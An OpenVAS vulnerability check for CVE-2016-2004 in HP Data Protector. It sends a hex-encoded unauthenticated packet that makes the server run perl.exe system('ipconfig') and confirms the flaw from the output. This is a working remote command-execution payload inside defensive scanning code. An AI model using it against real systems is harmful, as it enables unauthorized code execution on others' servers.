###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_hp_data_protector_encry_comm_arbi_code_exec_vuln.nasl 12465 2018-11-21 13:24:34Z cfischer $
#
# HP Data Protector Encrypted Communications Arbitrary Command Execution Vulnerability
#
# Authors:
# Tushar Khelge <ktushar@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:hp:data_protector";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.808540");
  script_version("$Revision: 12465 $");
  script_cve_id("CVE-2016-2004");
  script_bugtraq_id(87053);
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-11-21 14:24:34 +0100 (Wed, 21 Nov 2018) $");
  script_tag(name:"creation_date", value:"2016-07-08 13:00:46 +0530 (Fri, 08 Jul 2016)");
  script_name("HP Data Protector Encrypted Communications Arbitrary Command Execution Vulnerability");
  script_category(ACT_GATHER_INFO);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("General");
  script_dependencies("hp_data_protector_installed.nasl");
  script_require_ports("Services/hp_dataprotector", 5555);
  script_mandatory_keys("hp_data_protector/installed");

  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/267328");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39858");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/137341");
  script_xref(name:"URL", value:"https://dl.packetstormsecurity.net/1605-exploits/hpdataprotectora0900-exec.txt");
  script_xref(name:"URL", value:"https://h20564.www2.hpe.com/hpsc/doc/public/display?docId=emr_na-c05085988");

  script_tag(name:"summary", value:"This host is installed HP Data Protector
  and is prone to Arbitrary Command Execution vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP POST request and check
  whether it is possible to execute command.");

  script_tag(name:"insight", value:"The flaw is due to Data Protector does not
  authenticate users, even with Encrypted Control Communications enabled.");

  script_tag(name:"impact", value:"Successful exploitation will allow
  remote attackers to execute arbitrary code.");

  script_tag(name:"affected", value:"HPE Data Protector before 7.03_108,
  8.x before 8.15, and 9.x before 9.06.");

  script_tag(name:"solution", value:"Apply the patch from the referenced advisory.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
get_app_location( cpe:CPE, port:port, nofork:TRUE ); # To have a reference to the Detection NVT within the GSA

soc = open_sock_tcp( port );
if( ! soc ) exit( 0 );

# nb: Attack string (ipconfig)
req = raw_string( 0x00, 0x00, 0x00, 0x36, 0x32, 0x00, 0x01, 0x01,
                  0x01, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x01,
                  0x00, 0x01, 0x00, 0x01, 0x01, 0x00, 0x20, 0x32,
                  0x38, 0x00, 0x5c, 0x70, 0x65, 0x72, 0x6c, 0x2e,
                  0x65, 0x78, 0x65, 0x00, 0x20, 0x2d, 0x65, 0x73,
                  0x79, 0x73, 0x74, 0x65, 0x6d, 0x28, 0x27, 0x69,
                  0x70, 0x63, 0x6f, 0x6e, 0x66, 0x69, 0x67, 0x27,
                  0x29, 0x00 );

send( socket:soc, data:req );

sleep( 5 );

res = recv( socket:soc, length:4096 );

len = strlen( res );
if( ! len ) exit( 0 );

data = ""; # nb: To make openvas-nasl-lint happy...

for( i = 0; i < len; i = i + 1 ) {
  if( ( ord( res[i] ) >= 61 ) ) {
    data += res[i];
  }
}

close( soc );

if( "WindowsIPConfiguration" >< data && "EthernetadapterLocalAreaConnection" >< data ) {
  security_message( port:port );
  exit( 0 );
}

exit( 99 );